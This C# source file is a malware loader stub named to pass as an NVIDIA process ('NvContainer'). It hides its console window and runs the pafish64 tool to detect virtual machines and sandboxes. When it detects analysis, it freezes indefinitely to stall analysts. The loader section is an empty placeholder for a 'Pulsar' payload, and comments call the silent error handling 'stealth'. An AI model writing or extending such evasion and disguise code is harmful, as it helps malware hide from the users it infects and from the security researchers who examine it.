using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Linq;

using System.Runtime.InteropServices;

namespace NvContainer
{
    static class Program
    {
        private const int MAX_TRACES = 5;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        [STAThread]
        static void Main()
        {
            // --- GHOST MODE: ABSOLUTE TERMINAL HIDE ---
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }

            // --- ADVANCED ANTI-VM / SANDBOX GUARD ---
            if (IsAnalysisDetected())
            {
                // Enter "Frozen" state (Deep Freeze)
                // This makes the process hang indefinitely to frustrate analysis
                while (true)
                {
                    Thread.Sleep(int.MaxValue);
                }
            }

            // --- MAIN LOADER LOGIC ---
            try
            {
                // Proceed with background tasks if clean
                // Pulsar logic goes here...
            }
            catch (Exception)
            {
                // Silent fail for stealth
            }
        }

        /// <summary>
        /// Analyzes pafish64 log for security traces.
        /// If traces >= MAX_TRACES, returns true to freeze.
        /// </summary>
        private static bool IsAnalysisDetected()
        {
            string pafishPath = "pafish64.exe";
            if (!File.Exists(pafishPath)) return false; // If tool missing, assume safe for now

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = pafishPath,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };

                using (Process p = Process.Start(psi))
                {
                    string output = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();

                    // Count occurring traces (keywords like "traced" or "detected")
                    // Example: "[pafish] Sandbox traced by missing dialog confirmation"
                    int tracesCount = 0;
                    string[] lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);

                    foreach (string line in lines)
                    {
                        if (line.ToLower().Contains("traced") || line.ToLower().Contains("found"))
                        {
                            tracesCount++;
                        }
                    }

                    return tracesCount >= MAX_TRACES;
                }
            }
            catch
            {
                return true; // If something errors out during check, safer to assumes analysis
            }
        }
    }
}
